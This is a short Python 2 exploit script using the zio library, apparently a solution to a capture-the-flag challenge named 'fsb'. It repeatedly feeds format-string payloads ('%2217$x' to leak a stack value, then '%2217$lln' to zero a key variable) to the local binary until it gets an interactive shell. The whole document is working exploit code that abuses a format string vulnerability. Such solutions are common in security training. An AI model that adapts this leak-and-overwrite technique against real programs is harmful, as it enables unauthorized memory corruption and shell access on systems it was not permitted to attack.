from zio import *
target  = './fsb'

adr_buf     = 0x804a100
adr_buf2    = 0x804a080
adr_key     = 0x804a060
adr_execve  = 0x80486ab

def exp(target):
    io = zio('./fsb', print_read = False, print_write = False)
    io.read_until('(1)')
    io.writeline('%2217$x')
    leak = 0
    try :
        io.read_line()
        leak = int(io.read_until('\n')[0:-1], 16)
    except :
        pass
    print hex(leak)
    if leak != 0x804a060:
        io.close() 
        return
    else :
        print '\n[+] find address of key'
        io.read_until('(2)')
        io.writeline('%2217$lln')
        io.read_until('(3)')
        io.writeline('0')
        io.read_until('(4)')
        io.writeline('0')
        io.read_until('key :')
        io.writeline('0')
        print '[+] your shell !'
        io.interact()
        io.close()
        exit()

print '[-] please wait'
while True:
    exp(target)
